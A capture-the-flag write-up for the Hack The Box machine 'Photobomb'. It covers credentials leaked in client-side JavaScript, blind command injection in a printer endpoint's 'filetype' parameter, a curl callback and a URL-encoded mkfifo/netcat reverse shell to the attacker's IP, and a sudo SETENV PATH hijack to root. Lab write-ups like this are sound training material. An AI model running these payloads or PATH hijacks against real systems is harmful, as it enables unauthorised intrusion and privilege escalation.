---
layout: post
title: "HTB: Photobomb"
subtitle: "leaked tech-support Basic auth into command injection on the printer endpoint, then a sudo SETENV PATH hijack to root"
date: 2023-02-02
tags: [htb, linux, command-injection, sudo, privesc]
category: writeups
kind: machine
tldr: "A JS file pre-filled tech-support creds when a specific cookie was set, giving Basic auth to /printer. The filetype POST param had OS command injection for a shell as wizard. Root came from a sudo SETENV rule that let me prepend /tmp to PATH and hijack find and cd called by /opt/cleanup.sh."
---

## the box

Photobomb is an easy Linux box running a small image app on nginx port 80, plus SSH. The site is a Sinatra app that downloads stock photos in different formats and sizes. Creds for the tech-support area are sitting in client-side JS behind a cookie check. Those creds reach a printer endpoint with command injection in one of its parameters, which gives a shell as `wizard`. Root is a sudo rule that keeps the environment with `SETENV`, so I can point `PATH` at a directory I control and hijack a bare command name the root script calls.

## recon

Two ports.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 622B9ED3F0195B2D1811DF6F278518C2
|_http-title: Photobomb
| http-methods:
|_  Supported Methods: GET HEAD
```

The site redirects to `photobomb.htb`, so I added it to `/etc/hosts`:

```bash
echo '10.10.11.182 photobomb.htb' | sudo tee -a /etc/hosts
```

Browsing `http://photobomb.htb/` is a gallery. The page source loads `photobomb.js`, which has the interesting bit:

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

When the cookie `isPhotoBombTechSupport` is present, the page rewrites the `creds` link to embed `pH0t0:b0Mb!` as HTTP Basic auth for `/printer`. The credentials are `pH0t0` / `b0Mb!`. I set the cookie with a cookie-manager browser extension:

```
isPhotoBombTechSupport=test
```

Reloaded the page, followed the now-populated link, and reached `/printer`. The Basic auth header is just those creds base64-encoded:

```
Authorization: Basic cEgwdDA6YjBNYiE=
```

Poking the app confirms it is Sinatra. A bad path returns the Sinatra error page, which leaks the framework outright:

```
Sinatra doesn't know this ditty.
Try this:
get '/ui_images/' do
  "Hello World"
end
```

## foothold

The printer page submits a POST to `/printer` with three fields: `photo`, `filetype`, and `dimensions`. The app shells out to convert the chosen photo to the requested type and size, which is exactly the kind of place to look for command injection.

The injection is blind, the app returns nothing useful, so I narrowed the parameter by behavior. Injecting into `photo` or `dimensions` returns a 500 immediately because they are validated against allowed values. `filetype` is the one concatenated straight into the shell call, and appending a command to it actually ran. I confirmed with an out-of-band callback: put a `curl` to my box after a semicolon, watch for the hit.

```
POST /printer HTTP/1.1
Host: photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Content-Type: application/x-www-form-urlencoded
Cookie: isPhotoBombTechSupport=test

photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg; curl http://10.10.16.52:8000/test&dimensions=3000x2000
```

My Python web server logged the request, so `filetype` runs arbitrary commands. I swapped the curl for a reverse shell. The `filetype` value, URL-encoded, is `jpg; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.52 8484 >/tmp/f`:

```
photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg%3B%20rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.52%208484%20%3E%2Ftmp%2Ff&dimensions=3000x2000
```

With `nc -lvnp 8484` waiting, sending that caught the shell.

## user

The shell came back as `wizard`, which owns the user flag. There is an SSH key in the home directory, so I pulled it for a stable session instead of the fragile netcat shell.

```bash
ssh -i id_rsa wizard@photobomb.htb
```

## root

First thing on any shell is `sudo -l`:

```bash
sudo -l
```

```
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

`wizard` runs `/opt/cleanup.sh` as root with no password, and the rule carries `SETENV`. That `SETENV` is the bug. Normally `secure_path` forces a clean `PATH` for sudo'd commands, but `SETENV` lets me override environment variables on the command line, including `PATH`, which cancels `secure_path` out.

The script:

```bash
cat /opt/cleanup.sh
```

```bash
#!/bin/bash
. `pwd`/.bashrc
cd /home/wizard/photobomb
truncate -s0 log/photobomb.log
for foo in `ls source_images`; do
  if [ ! -f "source_images/$foo" ]; then
    rm "source_images/$foo"
  fi
done
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Most commands use absolute paths or builtins, but `find` is called by bare name. Because I control `PATH`, I can drop a fake `find` earlier in `PATH` and the root script runs mine.

```bash
cd /dev/shm
echo -e '#!/bin/bash\nbash' > find
chmod +x find
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

When the script reaches `find`, it executes `/dev/shm/find`, which spawns a root bash. Root shell, root flag.

There is a second route through the same script. The first line is `. `pwd`/.bashrc`, and the box's `.bashrc` contains `enable -n [`, which disables the `[` bash builtin. With the builtin off, the `[ ! -f ... ]` test forces bash to search `PATH` for an external `[` binary. Same `PATH` trick, different hijacked name:

```bash
cd /dev/shm
echo -e '#!/bin/bash\nbash' > [
chmod +x [
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

That fires my `[` before `find` is ever reached. Both land root.

## takeaway

The creds were never hidden, just gated behind a cookie check in client-side JS, so reading the source was the whole foothold. The printer trusted one of three params straight into a shell call. The root step is a clean lesson in `SETENV`: it defeats `secure_path`, so a sudo grant on any script that calls even one command by bare name (here `find`, or `[` once `.bashrc` disables the builtin) is a `PATH` hijack waiting to happen.
